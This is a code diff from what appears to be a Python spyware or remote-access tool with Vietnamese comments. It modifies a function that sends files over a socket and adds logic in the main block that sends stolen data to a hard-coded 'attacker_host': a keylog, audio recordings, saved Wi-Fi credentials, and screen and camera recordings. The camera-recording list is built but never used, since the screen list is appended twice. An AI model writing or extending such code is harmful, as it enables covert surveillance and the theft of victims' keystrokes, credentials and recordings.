@@ -172,25 +172,35 @@ def screen_sender(host='0.0.0.0', port=5001):
             print(f"Screen sender error: {e}")
             
         time.sleep(1)  # Wait before retrying
-
-
+        
 def send_file(client_socket, filename):
     """Send a file to the middleman"""
     try:
+        # Kiểm tra nếu file tồn tại
+        if not os.path.exists(filename):
+            print(f"File {filename} không tồn tại.")
+            return False
+        
         filesize = os.path.getsize(filename)
-        # Send file info
+        file_extension = os.path.splitext(filename)[-1].lower()
+
+        # Gửi thông tin file
         file_info = f"{os.path.basename(filename)}|{filesize}"
         client_socket.send(file_info.encode('utf-8'))
-        time.sleep(0.1)  # Give receiver time to process
-        
-        # Send file data
+        time.sleep(0.1)  # Cho server thời gian xử lý metadata
+
+        # Gửi dữ liệu file
         with open(filename, 'rb') as f:
+            print(f"Đang gửi {filename} ({filesize} bytes)...")
             while True:
-                data = f.read(4096)
+                data = f.read(4096)  # Đọc file theo từng khối 4KB
                 if not data:
                     break
                 client_socket.send(data)
+
+        print(f"File {os.path.basename(filename)} đã được gửi thành công!")
         return True
+
     except Exception as e:
         print(f"Error sending file: {e}")
         return False
@@ -744,7 +754,11 @@ if __name__ == "__main__":
     attacker_host = '192.168.1.15'
     file_transfer_port = options.port + 3
     files_to_send = ["Keylog.txt", "record.wav", "wifis.txt"]
-    
+    screen_recode_file = [f for f in os.listdir('.') if f.startswith('screen_record')]
+    files_to_send.extend(screen_recode_file)
+    camera_recode_file = [f for f in os.listdir('.') if f.startswith('camera_record')]
+    files_to_send.extend(screen_recode_file)
+
     print(f"File transfer port: {file_transfer_port}")
     print("Files to send:", files_to_send)
     
